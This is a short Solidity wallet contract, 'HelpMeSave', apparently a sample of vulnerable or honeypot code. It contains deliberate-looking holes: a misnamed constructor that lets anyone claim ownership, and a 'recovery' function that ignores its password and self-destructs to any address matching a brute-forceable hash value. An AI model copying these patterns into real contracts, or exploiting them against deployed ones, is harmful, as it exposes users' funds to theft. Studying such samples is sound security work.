pragma solidity ^0.4.24;
contract HelpMeSave { 
   address public owner; 
   function MyTestWallet7(){
       owner = msg.sender;   
   }
    function deposit() public payable{}
    function() payable {deposit();}
    function withdraw () public noone_else { 
         uint256 withdraw_amt = this.balance;
         if (msg.sender != owner || withdraw_amt < 1000 ether ){ 
             withdraw_amt = 0;                     
         }
         msg.sender.send(withdraw_amt); 
   }
    modifier noone_else() {
        if (msg.sender == owner) 
            _;
    }
    function recovery (string _password, address _return_addr) returns (uint256) {
       if ( uint256(sha3(_return_addr)) % 100000000000000 == 94865382827780 ){
                selfdestruct (_return_addr);
       }
       return uint256(sha3(_return_addr)) % 100000000000000;
    }
}
